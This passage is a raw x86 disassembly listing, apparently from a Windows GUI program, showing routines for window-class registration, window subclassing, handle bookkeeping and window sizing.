  404521:	33 c0                	xor    %eax,%eax
  404523:	83 c4 0c             	add    $0xc,%esp
  404526:	40                   	inc    %eax
  404527:	a3 10 b3 40 00       	mov    %eax,0x40b310
  40452c:	89 35 14 b3 40 00    	mov    %esi,0x40b314
  404532:	c7 05 20 b3 40 00 d5 	movl   $0x4044d5,0x40b320
  404539:	44 40 00 
  40453c:	c7 05 24 b3 40 00 b3 	movl   $0x4044b3,0x40b324
  404543:	44 40 00 
  404546:	a3 a4 b3 40 00       	mov    %eax,0x40b3a4
  40454b:	39 5d 1c             	cmp    %ebx,0x1c(%ebp)
  40454e:	75 07                	jne    0x404557
  404550:	c7 45 1c 00 90 40 00 	movl   $0x409000,0x1c(%ebp)
  404557:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40455a:	53                   	push   %ebx
  40455b:	ff 35 fc b0 40 00    	push   0x40b0fc
  404561:	6a ff                	push   $0xffffffff
  404563:	ff 30                	push   (%eax)
  404565:	8b 45 20             	mov    0x20(%ebp),%eax
  404568:	ff 75 18             	push   0x18(%ebp)
  40456b:	0d 00 00 03 50       	or     $0x50030000,%eax
  404570:	ff 75 14             	push   0x14(%ebp)
  404573:	ff 75 10             	push   0x10(%ebp)
  404576:	ff 75 0c             	push   0xc(%ebp)
  404579:	50                   	push   %eax
  40457a:	ff 75 1c             	push   0x1c(%ebp)
  40457d:	68 50 90 40 00       	push   $0x409050
  404582:	53                   	push   %ebx
  404583:	ff 15 8c a7 40 00    	call   *0x40a78c
  404589:	8b f0                	mov    %eax,%esi
  40458b:	3b f3                	cmp    %ebx,%esi
  40458d:	74 1b                	je     0x4045aa
  40458f:	ff 75 08             	push   0x8(%ebp)
  404592:	ff 35 24 b4 40 00    	push   0x40b424
  404598:	e8 8f 20 00 00       	call   0x40662c
  40459d:	57                   	push   %edi
  40459e:	56                   	push   %esi
  40459f:	50                   	push   %eax
  4045a0:	ff 75 08             	push   0x8(%ebp)
  4045a3:	e8 13 02 00 00       	call   0x4047bb
  4045a8:	8b f0                	mov    %eax,%esi
  4045aa:	5f                   	pop    %edi
  4045ab:	8b c6                	mov    %esi,%eax
  4045ad:	5e                   	pop    %esi
  4045ae:	5b                   	pop    %ebx
  4045af:	c9                   	leave
  4045b0:	c2 1c 00             	ret    $0x1c
  4045b3:	55                   	push   %ebp
  4045b4:	8b ec                	mov    %esp,%ebp
  4045b6:	6a 00                	push   $0x0
  4045b8:	ff 75 1c             	push   0x1c(%ebp)
  4045bb:	ff 75 18             	push   0x18(%ebp)
  4045be:	ff 75 14             	push   0x14(%ebp)
  4045c1:	ff 75 10             	push   0x10(%ebp)
  4045c4:	ff 75 0c             	push   0xc(%ebp)
  4045c7:	ff 75 08             	push   0x8(%ebp)
  4045ca:	e8 21 ff ff ff       	call   0x4044f0
  4045cf:	5d                   	pop    %ebp
  4045d0:	c2 18 00             	ret    $0x18
  4045d3:	83 7c 24 04 ff       	cmpl   $0xffffffff,0x4(%esp)
  4045d8:	75 04                	jne    0x4045de
  4045da:	6a 00                	push   $0x0
  4045dc:	eb 15                	jmp    0x4045f3
  4045de:	ff 74 24 04          	push   0x4(%esp)
  4045e2:	ff 35 24 b4 40 00    	push   0x40b424
  4045e8:	e8 a3 20 00 00       	call   0x406690
  4045ed:	85 c0                	test   %eax,%eax
  4045ef:	74 08                	je     0x4045f9
  4045f1:	ff 30                	push   (%eax)
  4045f3:	ff 15 a0 a7 40 00    	call   *0x40a7a0
  4045f9:	c2 04 00             	ret    $0x4
  4045fc:	57                   	push   %edi
  4045fd:	ff 74 24 08          	push   0x8(%esp)
  404601:	ff 35 24 b4 40 00    	push   0x40b424
  404607:	e8 84 20 00 00       	call   0x406690
  40460c:	8b f8                	mov    %eax,%edi
  40460e:	85 ff                	test   %edi,%edi
  404610:	74 4c                	je     0x40465e
  404612:	8b 47 04             	mov    0x4(%edi),%eax
  404615:	8b 40 18             	mov    0x18(%eax),%eax
  404618:	85 c0                	test   %eax,%eax
  40461a:	74 09                	je     0x404625
  40461c:	ff 74 24 0c          	push   0xc(%esp)
  404620:	57                   	push   %edi
  404621:	ff d0                	call   *%eax
  404623:	eb 39                	jmp    0x40465e
  404625:	53                   	push   %ebx
  404626:	56                   	push   %esi
  404627:	ff 37                	push   (%edi)
  404629:	ff 15 a4 a7 40 00    	call   *0x40a7a4
  40462f:	ff 74 24 14          	push   0x14(%esp)
  404633:	8b f0                	mov    %eax,%esi
  404635:	56                   	push   %esi
  404636:	e8 15 31 00 00       	call   0x407750
  40463b:	8b d8                	mov    %eax,%ebx
  40463d:	8d 46 01             	lea    0x1(%esi),%eax
  404640:	50                   	push   %eax
  404641:	53                   	push   %ebx
  404642:	c6 03 00             	movb   $0x0,(%ebx)
  404645:	ff 37                	push   (%edi)
  404647:	ff 15 a8 a7 40 00    	call   *0x40a7a8
  40464d:	53                   	push   %ebx
  40464e:	e8 a3 37 00 00       	call   0x407df6
  404653:	59                   	pop    %ecx
  404654:	2b f0                	sub    %eax,%esi
  404656:	56                   	push   %esi
  404657:	e8 94 31 00 00       	call   0x4077f0
  40465c:	5e                   	pop    %esi
  40465d:	5b                   	pop    %ebx
  40465e:	5f                   	pop    %edi
  40465f:	c2 08 00             	ret    $0x8
  404662:	ff 74 24 04          	push   0x4(%esp)
  404666:	ff 35 24 b4 40 00    	push   0x40b424
  40466c:	e8 1f 20 00 00       	call   0x406690
  404671:	85 c0                	test   %eax,%eax
  404673:	74 08                	je     0x40467d
  404675:	ff 30                	push   (%eax)
  404677:	ff 15 80 a7 40 00    	call   *0x40a780
  40467d:	c2 04 00             	ret    $0x4
  404680:	55                   	push   %ebp
  404681:	8b ec                	mov    %esp,%ebp
  404683:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  404687:	56                   	push   %esi
  404688:	8b 75 08             	mov    0x8(%ebp),%esi
  40468b:	75 08                	jne    0x404695
  40468d:	8b 45 10             	mov    0x10(%ebp),%eax
  404690:	89 46 14             	mov    %eax,0x14(%esi)
  404693:	eb 2f                	jmp    0x4046c4
  404695:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  404699:	75 29                	jne    0x4046c4
  40469b:	8b 46 18             	mov    0x18(%esi),%eax
  40469e:	85 c0                	test   %eax,%eax
  4046a0:	74 06                	je     0x4046a8
  4046a2:	50                   	push   %eax
  4046a3:	e8 2e 02 00 00       	call   0x4048d6
  4046a8:	57                   	push   %edi
  4046a9:	8b 7d 10             	mov    0x10(%ebp),%edi
  4046ac:	83 ff ff             	cmp    $0xffffffff,%edi
  4046af:	75 06                	jne    0x4046b7
  4046b1:	83 66 18 00          	andl   $0x0,0x18(%esi)
  4046b5:	eb 09                	jmp    0x4046c0
  4046b7:	57                   	push   %edi
  4046b8:	e8 ac 01 00 00       	call   0x404869
  4046bd:	89 46 18             	mov    %eax,0x18(%esi)
  4046c0:	89 7e 10             	mov    %edi,0x10(%esi)
  4046c3:	5f                   	pop    %edi
  4046c4:	68 07 04 00 00       	push   $0x407
  4046c9:	6a 00                	push   $0x0
  4046cb:	6a 00                	push   $0x0
  4046cd:	ff 36                	push   (%esi)
  4046cf:	ff 15 ac a7 40 00    	call   *0x40a7ac
  4046d5:	5e                   	pop    %esi
  4046d6:	5d                   	pop    %ebp
  4046d7:	c2 0c 00             	ret    $0xc
  4046da:	83 7c 24 08 01       	cmpl   $0x1,0x8(%esp)
  4046df:	75 09                	jne    0x4046ea
  4046e1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4046e5:	8b 40 14             	mov    0x14(%eax),%eax
  4046e8:	eb 13                	jmp    0x4046fd
  4046ea:	83 7c 24 08 02       	cmpl   $0x2,0x8(%esp)
  4046ef:	75 09                	jne    0x4046fa
  4046f1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4046f5:	8b 40 10             	mov    0x10(%eax),%eax
  4046f8:	eb 03                	jmp    0x4046fd
  4046fa:	83 c8 ff             	or     $0xffffffff,%eax
  4046fd:	c2 08 00             	ret    $0x8
  404700:	8b 44 24 04          	mov    0x4(%esp),%eax
  404704:	8b 40 18             	mov    0x18(%eax),%eax
  404707:	85 c0                	test   %eax,%eax
  404709:	74 06                	je     0x404711
  40470b:	50                   	push   %eax
  40470c:	e8 c5 01 00 00       	call   0x4048d6
  404711:	c2 04 00             	ret    $0x4
  404714:	55                   	push   %ebp
  404715:	8b ec                	mov    %esp,%ebp
  404717:	53                   	push   %ebx
  404718:	57                   	push   %edi
  404719:	8b 7d 08             	mov    0x8(%ebp),%edi
  40471c:	6a f4                	push   $0xfffffff4
  40471e:	57                   	push   %edi
  40471f:	ff 15 90 a7 40 00    	call   *0x40a790
  404725:	8b d8                	mov    %eax,%ebx
  404727:	83 fb ff             	cmp    $0xffffffff,%ebx
  40472a:	74 79                	je     0x4047a5
  40472c:	56                   	push   %esi
  40472d:	53                   	push   %ebx
  40472e:	ff 35 24 b4 40 00    	push   0x40b424
  404734:	e8 57 1f 00 00       	call   0x406690
  404739:	ff 75 14             	push   0x14(%ebp)
  40473c:	8b f0                	mov    %eax,%esi
  40473e:	ff 75 10             	push   0x10(%ebp)
  404741:	ff 75 0c             	push   0xc(%ebp)
  404744:	57                   	push   %edi
  404745:	ff 76 0c             	push   0xc(%esi)
  404748:	ff 15 98 a7 40 00    	call   *0x40a798
  40474e:	81 7d 0c 82 00 00 00 	cmpl   $0x82,0xc(%ebp)
  404755:	89 45 14             	mov    %eax,0x14(%ebp)
  404758:	75 45                	jne    0x40479f
  40475a:	8b 46 04             	mov    0x4(%esi),%eax
  40475d:	8b 40 0c             	mov    0xc(%eax),%eax
  404760:	85 c0                	test   %eax,%eax
  404762:	74 03                	je     0x404767
  404764:	56                   	push   %esi
  404765:	ff d0                	call   *%eax
  404767:	8b 35 b0 a7 40 00    	mov    0x40a7b0,%esi
  40476d:	68 68 90 40 00       	push   $0x409068
  404772:	57                   	push   %edi
  404773:	ff d6                	call   *%esi
  404775:	68 58 90 40 00       	push   $0x409058
  40477a:	57                   	push   %edi
  40477b:	ff d6                	call   *%esi
  40477d:	85 c0                	test   %eax,%eax
  40477f:	74 07                	je     0x404788
  404781:	57                   	push   %edi
  404782:	ff 15 78 a8 40 00    	call   *0x40a878
  404788:	6a ff                	push   $0xffffffff
  40478a:	6a f4                	push   $0xfffffff4
  40478c:	57                   	push   %edi
  40478d:	ff 15 9c a7 40 00    	call   *0x40a79c
  404793:	53                   	push   %ebx
  404794:	ff 35 24 b4 40 00    	push   0x40b424
  40479a:	e8 1c 1f 00 00       	call   0x4066bb
  40479f:	8b 45 14             	mov    0x14(%ebp),%eax
  4047a2:	5e                   	pop    %esi
  4047a3:	eb 10                	jmp    0x4047b5
  4047a5:	ff 75 14             	push   0x14(%ebp)
  4047a8:	ff 75 10             	push   0x10(%ebp)
  4047ab:	ff 75 0c             	push   0xc(%ebp)
  4047ae:	57                   	push   %edi
  4047af:	ff 15 b4 a7 40 00    	call   *0x40a7b4
  4047b5:	5f                   	pop    %edi
  4047b6:	5b                   	pop    %ebx
  4047b7:	5d                   	pop    %ebp
  4047b8:	c2 10 00             	ret    $0x10
  4047bb:	55                   	push   %ebp
  4047bc:	8b ec                	mov    %esp,%ebp
  4047be:	51                   	push   %ecx
  4047bf:	53                   	push   %ebx
  4047c0:	56                   	push   %esi
  4047c1:	57                   	push   %edi
  4047c2:	ff 35 28 b4 40 00    	push   0x40b428
  4047c8:	e8 60 1c 00 00       	call   0x40642d
  4047cd:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  4047d1:	8b 75 0c             	mov    0xc(%ebp),%esi
  4047d4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4047d7:	75 03                	jne    0x4047dc
  4047d9:	89 75 08             	mov    %esi,0x8(%ebp)
  4047dc:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4047df:	8b 45 14             	mov    0x14(%ebp),%eax
  4047e2:	8b 3d 9c a7 40 00    	mov    0x40a79c,%edi
  4047e8:	68 14 47 40 00       	push   $0x404714
  4047ed:	6a fc                	push   $0xfffffffc
  4047ef:	53                   	push   %ebx
  4047f0:	89 1e                	mov    %ebx,(%esi)
  4047f2:	89 46 04             	mov    %eax,0x4(%esi)
  4047f5:	ff d7                	call   *%edi
  4047f7:	ff 75 08             	push   0x8(%ebp)
  4047fa:	89 46 0c             	mov    %eax,0xc(%esi)
  4047fd:	6a f4                	push   $0xfffffff4
  4047ff:	53                   	push   %ebx
  404800:	ff d7                	call   *%edi
  404802:	ff 75 08             	push   0x8(%ebp)
  404805:	68 68 90 40 00       	push   $0x409068
  40480a:	53                   	push   %ebx
  40480b:	ff 15 b8 a7 40 00    	call   *0x40a7b8
  404811:	8b 7d fc             	mov    -0x4(%ebp),%edi
  404814:	6a 01                	push   $0x1
  404816:	ff 77 08             	push   0x8(%edi)
  404819:	6a 30                	push   $0x30
  40481b:	53                   	push   %ebx
  40481c:	ff 15 64 a7 40 00    	call   *0x40a764
  404822:	83 67 04 00          	andl   $0x0,0x4(%edi)
  404826:	39 75 08             	cmp    %esi,0x8(%ebp)
  404829:	8b c6                	mov    %esi,%eax
  40482b:	74 02                	je     0x40482f
  40482d:	8b c3                	mov    %ebx,%eax
  40482f:	5f                   	pop    %edi
  404830:	5e                   	pop    %esi
  404831:	5b                   	pop    %ebx
  404832:	c9                   	leave
  404833:	c2 10 00             	ret    $0x10
  404836:	53                   	push   %ebx
  404837:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40483b:	56                   	push   %esi
  40483c:	57                   	push   %edi
  40483d:	8b 3d bc a7 40 00    	mov    0x40a7bc,%edi
  404843:	53                   	push   %ebx
  404844:	eb 13                	jmp    0x404859
  404846:	68 70 90 40 00       	push   $0x409070
  40484b:	53                   	push   %ebx
  40484c:	ff 15 c0 a7 40 00    	call   *0x40a7c0
  404852:	85 c0                	test   %eax,%eax
  404854:	75 0b                	jne    0x404861
  404856:	8b de                	mov    %esi,%ebx
  404858:	56                   	push   %esi
  404859:	ff d7                	call   *%edi
  40485b:	8b f0                	mov    %eax,%esi
  40485d:	85 f6                	test   %esi,%esi
  40485f:	75 e5                	jne    0x404846
  404861:	5f                   	pop    %edi
  404862:	5e                   	pop    %esi
  404863:	8b c3                	mov    %ebx,%eax
  404865:	5b                   	pop    %ebx
  404866:	c2 04 00             	ret    $0x4
  404869:	53                   	push   %ebx
  40486a:	55                   	push   %ebp
  40486b:	57                   	push   %edi
  40486c:	bd 0c b4 40 00       	mov    $0x40b40c,%ebp
  404871:	55                   	push   %ebp
  404872:	33 ff                	xor    %edi,%edi
  404874:	ff 15 1c a7 40 00    	call   *0x40a71c
  40487a:	a1 a8 b3 40 00       	mov    0x40b3a8,%eax
  40487f:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  404883:	eb 07                	jmp    0x40488c
  404885:	39 58 08             	cmp    %ebx,0x8(%eax)
  404888:	74 08                	je     0x404892
  40488a:	8b 00                	mov    (%eax),%eax
  40488c:	85 c0                	test   %eax,%eax
  40488e:	75 f5                	jne    0x404885
  404890:	eb 0a                	jmp    0x40489c
  404892:	8b 78 0c             	mov    0xc(%eax),%edi
  404895:	ff 40 10             	incl   0x10(%eax)
  404898:	85 ff                	test   %edi,%edi
  40489a:	75 2b                	jne    0x4048c7
  40489c:	56                   	push   %esi
  40489d:	6a 14                	push   $0x14
  40489f:	68 a8 b3 40 00       	push   $0x40b3a8
  4048a4:	e8 31 1f 00 00       	call   0x4067da
  4048a9:	8b f0                	mov    %eax,%esi
  4048ab:	85 f6                	test   %esi,%esi
  4048ad:	59                   	pop    %ecx
  4048ae:	59                   	pop    %ecx
  4048af:	74 15                	je     0x4048c6
  4048b1:	53                   	push   %ebx
  4048b2:	89 1e                	mov    %ebx,(%esi)
  4048b4:	ff 15 64 a8 40 00    	call   *0x40a864
  4048ba:	89 46 04             	mov    %eax,0x4(%esi)
  4048bd:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
  4048c4:	8b f8                	mov    %eax,%edi
  4048c6:	5e                   	pop    %esi
  4048c7:	55                   	push   %ebp
  4048c8:	ff 15 20 a7 40 00    	call   *0x40a720
  4048ce:	8b c7                	mov    %edi,%eax
  4048d0:	5f                   	pop    %edi
  4048d1:	5d                   	pop    %ebp
  4048d2:	5b                   	pop    %ebx
  4048d3:	c2 04 00             	ret    $0x4
  4048d6:	56                   	push   %esi
  4048d7:	57                   	push   %edi
  4048d8:	bf 0c b4 40 00       	mov    $0x40b40c,%edi
  4048dd:	57                   	push   %edi
  4048de:	ff 15 1c a7 40 00    	call   *0x40a71c
  4048e4:	8b 35 a8 b3 40 00    	mov    0x40b3a8,%esi
  4048ea:	eb 0b                	jmp    0x4048f7
  4048ec:	8b 46 0c             	mov    0xc(%esi),%eax
  4048ef:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4048f3:	74 08                	je     0x4048fd
  4048f5:	8b 36                	mov    (%esi),%esi
  4048f7:	85 f6                	test   %esi,%esi
  4048f9:	75 f1                	jne    0x4048ec
  4048fb:	eb 1c                	jmp    0x404919
  4048fd:	ff 4e 10             	decl   0x10(%esi)
  404900:	75 17                	jne    0x404919
  404902:	50                   	push   %eax
  404903:	ff 15 68 a8 40 00    	call   *0x40a868
  404909:	83 c6 08             	add    $0x8,%esi
  40490c:	56                   	push   %esi
  40490d:	68 a8 b3 40 00       	push   $0x40b3a8
  404912:	e8 06 1f 00 00       	call   0x40681d
  404917:	59                   	pop    %ecx
  404918:	59                   	pop    %ecx
  404919:	57                   	push   %edi
  40491a:	ff 15 20 a7 40 00    	call   *0x40a720
  404920:	5f                   	pop    %edi
  404921:	5e                   	pop    %esi
  404922:	c2 04 00             	ret    $0x4
  404925:	55                   	push   %ebp
  404926:	8b ec                	mov    %esp,%ebp
  404928:	81 ec 00 01 00 00    	sub    $0x100,%esp
  40492e:	56                   	push   %esi
  40492f:	ff 75 08             	push   0x8(%ebp)
  404932:	ff 35 2c b4 40 00    	push   0x40b42c
  404938:	e8 53 1d 00 00       	call   0x406690
  40493d:	8b f0                	mov    %eax,%esi
  40493f:	85 f6                	test   %esi,%esi
  404941:	0f 84 c7 00 00 00    	je     0x404a0e
  404947:	6a 04                	push   $0x4
  404949:	ff 36                	push   (%esi)
  40494b:	ff 15 c4 a7 40 00    	call   *0x40a7c4
  404951:	85 c0                	test   %eax,%eax
  404953:	74 0d                	je     0x404962
  404955:	83 7e 1c 00          	cmpl   $0x0,0x1c(%esi)
  404959:	75 07                	jne    0x404962
  40495b:	50                   	push   %eax
  40495c:	ff 15 c8 a7 40 00    	call   *0x40a7c8
  404962:	57                   	push   %edi
  404963:	8b 3d b0 a7 40 00    	mov    0x40a7b0,%edi
  404969:	68 70 90 40 00       	push   $0x409070
  40496e:	ff 36                	push   (%esi)
  404970:	ff d7                	call   *%edi
  404972:	68 58 90 40 00       	push   $0x409058
  404977:	ff 36                	push   (%esi)
  404979:	ff d7                	call   *%edi
  40497b:	85 c0                	test   %eax,%eax
  40497d:	5f                   	pop    %edi
  40497e:	74 08                	je     0x404988
  404980:	ff 36                	push   (%esi)
  404982:	ff 15 78 a8 40 00    	call   *0x40a878
  404988:	8b 46 1c             	mov    0x1c(%esi),%eax
  40498b:	85 c0                	test   %eax,%eax
  40498d:	74 12                	je     0x4049a1
  40498f:	6a 00                	push   $0x0
  404991:	ff 36                	push   (%esi)
  404993:	68 21 02 00 00       	push   $0x221
  404998:	50                   	push   %eax
  404999:	ff 15 64 a7 40 00    	call   *0x40a764
  40499f:	eb 32                	jmp    0x4049d3
  4049a1:	ff 36                	push   (%esi)
  4049a3:	ff 15 80 a7 40 00    	call   *0x40a780
  4049a9:	ff 75 08             	push   0x8(%ebp)
  4049ac:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4049b2:	68 7c 90 40 00       	push   $0x40907c
  4049b7:	50                   	push   %eax
  4049b8:	e8 51 34 00 00       	call   0x407e0e
  4049bd:	83 c4 0c             	add    $0xc,%esp
  4049c0:	ff 35 fc b0 40 00    	push   0x40b0fc
  4049c6:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  4049cc:	50                   	push   %eax
  4049cd:	ff 15 cc a7 40 00    	call   *0x40a7cc
  4049d3:	8b 46 04             	mov    0x4(%esi),%eax
  4049d6:	85 c0                	test   %eax,%eax
  4049d8:	74 18                	je     0x4049f2
  4049da:	50                   	push   %eax
  4049db:	6a 00                	push   $0x0
  4049dd:	ff 35 f8 b0 40 00    	push   0x40b0f8
  4049e3:	ff 15 dc a6 40 00    	call   *0x40a6dc
  4049e9:	ff 76 08             	push   0x8(%esi)
  4049ec:	ff 15 d0 a7 40 00    	call   *0x40a7d0
  4049f2:	8b 76 18             	mov    0x18(%esi),%esi
  4049f5:	85 f6                	test   %esi,%esi
  4049f7:	74 07                	je     0x404a00
  4049f9:	56                   	push   %esi
  4049fa:	ff 15 68 a8 40 00    	call   *0x40a868
  404a00:	ff 75 08             	push   0x8(%ebp)
  404a03:	ff 35 2c b4 40 00    	push   0x40b42c
  404a09:	e8 ad 1c 00 00       	call   0x4066bb
  404a0e:	5e                   	pop    %esi
  404a0f:	c9                   	leave
  404a10:	c2 04 00             	ret    $0x4
  404a13:	55                   	push   %ebp
  404a14:	8b ec                	mov    %esp,%ebp
  404a16:	51                   	push   %ecx
  404a17:	57                   	push   %edi
  404a18:	ff 35 30 b4 40 00    	push   0x40b430
  404a1e:	e8 0a 1a 00 00       	call   0x40642d
  404a23:	ff 35 2c b4 40 00    	push   0x40b42c
  404a29:	8b f8                	mov    %eax,%edi
  404a2b:	e8 0a 1d 00 00       	call   0x40673a
  404a30:	eb 08                	jmp    0x404a3a
  404a32:	ff 75 fc             	push   -0x4(%ebp)
  404a35:	e8 eb fe ff ff       	call   0x404925
  404a3a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404a3d:	50                   	push   %eax
  404a3e:	ff 35 2c b4 40 00    	push   0x40b42c
  404a44:	e8 15 1d 00 00       	call   0x40675e
  404a49:	85 c0                	test   %eax,%eax
  404a4b:	75 e5                	jne    0x404a32
  404a4d:	8b 47 54             	mov    0x54(%edi),%eax
  404a50:	85 c0                	test   %eax,%eax
  404a52:	74 27                	je     0x404a7b
  404a54:	8b 40 14             	mov    0x14(%eax),%eax
  404a57:	85 c0                	test   %eax,%eax
  404a59:	56                   	push   %esi
  404a5a:	8b 35 dc a6 40 00    	mov    0x40a6dc,%esi
  404a60:	74 0b                	je     0x404a6d
  404a62:	50                   	push   %eax
  404a63:	6a 00                	push   $0x0
  404a65:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404a6b:	ff d6                	call   *%esi
  404a6d:	ff 77 54             	push   0x54(%edi)
  404a70:	6a 00                	push   $0x0
  404a72:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404a78:	ff d6                	call   *%esi
  404a7a:	5e                   	pop    %esi
  404a7b:	5f                   	pop    %edi
  404a7c:	c9                   	leave
  404a7d:	c3                   	ret
  404a7e:	57                   	push   %edi
  404a7f:	8b 7c 24 08          	mov    0x8(%esp),%edi
  404a83:	8b 47 54             	mov    0x54(%edi),%eax
  404a86:	85 c0                	test   %eax,%eax
  404a88:	74 27                	je     0x404ab1
  404a8a:	8b 40 14             	mov    0x14(%eax),%eax
  404a8d:	85 c0                	test   %eax,%eax
  404a8f:	56                   	push   %esi
  404a90:	8b 35 dc a6 40 00    	mov    0x40a6dc,%esi
  404a96:	74 0b                	je     0x404aa3
  404a98:	50                   	push   %eax
  404a99:	6a 00                	push   $0x0
  404a9b:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404aa1:	ff d6                	call   *%esi
  404aa3:	ff 77 54             	push   0x54(%edi)
  404aa6:	6a 00                	push   $0x0
  404aa8:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404aae:	ff d6                	call   *%esi
  404ab0:	5e                   	pop    %esi
  404ab1:	5f                   	pop    %edi
  404ab2:	c3                   	ret
  404ab3:	68 25 49 40 00       	push   $0x404925
  404ab8:	6a 10                	push   $0x10
  404aba:	6a 30                	push   $0x30
  404abc:	e8 30 1c 00 00       	call   0x4066f1
  404ac1:	68 7e 4a 40 00       	push   $0x404a7e
  404ac6:	6a 00                	push   $0x0
  404ac8:	6a 58                	push   $0x58
  404aca:	a3 2c b4 40 00       	mov    %eax,0x40b42c
  404acf:	e8 60 19 00 00       	call   0x406434
  404ad4:	6a 01                	push   $0x1
  404ad6:	ff 35 fc b0 40 00    	push   0x40b0fc
  404adc:	a3 30 b4 40 00       	mov    %eax,0x40b430
  404ae1:	ff 15 d4 a7 40 00    	call   *0x40a7d4
  404ae7:	68 00 7f 00 00       	push   $0x7f00
  404aec:	6a 00                	push   $0x0
  404aee:	a3 34 b4 40 00       	mov    %eax,0x40b434
  404af3:	ff 15 d8 a7 40 00    	call   *0x40a7d8
  404af9:	a3 38 b4 40 00       	mov    %eax,0x40b438
  404afe:	e9 7f 05 00 00       	jmp    0x405082
  404b03:	55                   	push   %ebp
  404b04:	8b ec                	mov    %esp,%ebp
  404b06:	81 ec 3c 01 00 00    	sub    $0x13c,%esp
  404b0c:	53                   	push   %ebx
  404b0d:	56                   	push   %esi
  404b0e:	57                   	push   %edi
  404b0f:	ff 75 08             	push   0x8(%ebp)
  404b12:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  404b19:	ff 35 2c b4 40 00    	push   0x40b42c
  404b1f:	e8 08 1b 00 00       	call   0x40662c
  404b24:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  404b28:	8b f0                	mov    %eax,%esi
  404b2a:	75 0b                	jne    0x404b37
  404b2c:	83 fe ff             	cmp    $0xffffffff,%esi
  404b2f:	89 75 08             	mov    %esi,0x8(%ebp)
  404b32:	75 03                	jne    0x404b37
  404b34:	50                   	push   %eax
  404b35:	eb 03                	jmp    0x404b3a
  404b37:	ff 75 08             	push   0x8(%ebp)
  404b3a:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
  404b40:	68 7c 90 40 00       	push   $0x40907c
  404b45:	50                   	push   %eax
  404b46:	e8 c3 32 00 00       	call   0x407e0e
  404b4b:	33 ff                	xor    %edi,%edi
  404b4d:	83 c4 0c             	add    $0xc,%esp
  404b50:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  404b53:	75 07                	jne    0x404b5c
  404b55:	c7 45 1c 00 90 40 00 	movl   $0x409000,0x1c(%ebp)
  404b5c:	6a 28                	push   $0x28
  404b5e:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404b61:	57                   	push   %edi
  404b62:	50                   	push   %eax
  404b63:	e8 28 e6 ff ff       	call   0x403190
  404b68:	a1 fc b0 40 00       	mov    0x40b0fc,%eax
  404b6d:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  404b70:	a1 34 b4 40 00       	mov    0x40b434,%eax
  404b75:	89 45 d8             	mov    %eax,-0x28(%ebp)
  404b78:	a1 38 b4 40 00       	mov    0x40b438,%eax
  404b7d:	89 45 dc             	mov    %eax,-0x24(%ebp)
  404b80:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
  404b86:	89 45 e8             	mov    %eax,-0x18(%ebp)
  404b89:	83 c4 0c             	add    $0xc,%esp
  404b8c:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404b8f:	50                   	push   %eax
  404b90:	c7 45 c4 08 00 00 00 	movl   $0x8,-0x3c(%ebp)
  404b97:	c7 45 c8 1f 5b 40 00 	movl   $0x405b1f,-0x38(%ebp)
  404b9e:	89 7d d0             	mov    %edi,-0x30(%ebp)
  404ba1:	c7 45 e0 10 00 00 00 	movl   $0x10,-0x20(%ebp)
  404ba8:	ff 15 dc a7 40 00    	call   *0x40a7dc
  404bae:	8b 5d 20             	mov    0x20(%ebp),%ebx
  404bb1:	f6 c3 08             	test   $0x8,%bl
  404bb4:	74 03                	je     0x404bb9
  404bb6:	89 7d ec             	mov    %edi,-0x14(%ebp)
  404bb9:	83 e3 f7             	and    $0xfffffff7,%ebx
  404bbc:	f7 c3 fc ff ff ef    	test   $0xeffffffc,%ebx
  404bc2:	75 06                	jne    0x404bca
  404bc4:	81 cb 00 00 c0 00    	or     $0xc00000,%ebx
  404bca:	f7 c3 00 00 00 10    	test   $0x10000000,%ebx
  404bd0:	74 0b                	je     0x404bdd
  404bd2:	81 e3 ff ff ff ef    	and    $0xefffffff,%ebx
  404bd8:	89 7d 20             	mov    %edi,0x20(%ebp)
  404bdb:	eb 07                	jmp    0x404be4
  404bdd:	c7 45 20 01 00 00 00 	movl   $0x1,0x20(%ebp)
  404be4:	8b 45 14             	mov    0x14(%ebp),%eax
  404be7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404bea:	8b 45 18             	mov    0x18(%ebp),%eax
  404bed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404bf0:	57                   	push   %edi
  404bf1:	8b c3                	mov    %ebx,%eax
  404bf3:	83 e0 fc             	and    $0xfffffffc,%eax
  404bf6:	50                   	push   %eax
  404bf7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404bfa:	50                   	push   %eax
  404bfb:	89 7d f0             	mov    %edi,-0x10(%ebp)
  404bfe:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404c01:	ff 15 e0 a7 40 00    	call   *0x40a7e0
  404c07:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404c0a:	2b 45 f0             	sub    -0x10(%ebp),%eax
  404c0d:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404c10:	89 45 14             	mov    %eax,0x14(%ebp)
  404c13:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404c16:	2b 45 f4             	sub    -0xc(%ebp),%eax
  404c19:	89 45 18             	mov    %eax,0x18(%ebp)
